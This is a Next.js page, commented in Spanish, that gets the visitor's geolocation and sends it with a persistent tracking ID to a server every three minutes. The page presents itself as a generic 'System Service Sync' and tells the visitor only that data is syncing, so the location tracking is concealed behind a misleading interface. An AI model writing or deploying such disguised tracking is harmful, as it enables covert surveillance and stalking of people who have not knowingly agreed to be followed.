import Head from 'next/head';
import { useEffect, useState } from 'react';

export default function EnrollPage() {
  const [status, setStatus] = useState('Iniciando servicios de sincronización...');
  const [error, setError] = useState('');

  // Esta función envía la ubicación a tu API
  const sendLocation = (lat, lng) => {
    // ¡¡MUY IMPORTANTE!! Obtén el deviceId de alguna forma.
    // Una forma simple es guardarlo en el localStorage del navegador la primera vez.
    let deviceId = localStorage.getItem('rastreo_device_id');
    if (!deviceId) {
      deviceId = `web-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
      localStorage.setItem('rastreo_device_id', deviceId);
    }
    
    // La URL de tu API
    const API_URL = '/api/location'; // Next.js entiende esta ruta relativa

    fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId, lat, lng }),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Ubicación enviada:', data.message);
      setStatus(`Sincronizado por última vez: ${new Date().toLocaleTimeString()}`);
    })
    .catch(err => {
      console.error('Error al enviar ubicación:', err);
      setError('Error de conexión. Reintentando...');
    });
  };

  useEffect(() => {
    // 1. Pedir permiso de ubicación al usuario
    if ('geolocation' in navigator) {
      setStatus('Solicitando permiso de ubicación...');
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setStatus('Permiso concedido. Sincronización activa.');
          const { latitude, longitude } = position.coords;
          
          // Enviar ubicación inmediatamente
          sendLocation(latitude, longitude);

          // 2. Enviar la ubicación cada 3 minutos (3 * 60 * 1000 milisegundos)
          const intervalId = setInterval(() => {
            navigator.geolocation.getCurrentPosition(pos => {
                sendLocation(pos.coords.latitude, pos.coords.longitude);
            });
          }, 180000);

          return () => clearInterval(intervalId); // Limpiar al salir
        },
        (geoError) => {
          setError('Error: El permiso de ubicación es necesario para continuar.');
          setStatus('Servicio detenido.');
        }
      );
    } else {
      setError('Error: El servicio de geolocalización no está disponible en este dispositivo.');
    }
  }, []);

  return (
    <>
      <Head>
        <title>Sincronización de Dispositivo</title>
      </Head>
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white p-4 text-center">
        <h1 className="text-2xl font-bold">Servicios del Dispositivo</h1>
        <p className="mt-2">Sincronizando datos... Por favor, mantén esta ventana abierta.</p>
        <div className="mt-8 p-4 bg-gray-700 rounded-lg">
            <p className="text-lg">Estado: <span className="font-semibold text-teal-300">{status}</span></p>
            {error && <p className="text-red-400 mt-2">{error}</p>}
        </div>
        <p className="mt-8 text-xs text-gray-500">System Service Sync v1.0</p>
      </div>
    </>
  );
}
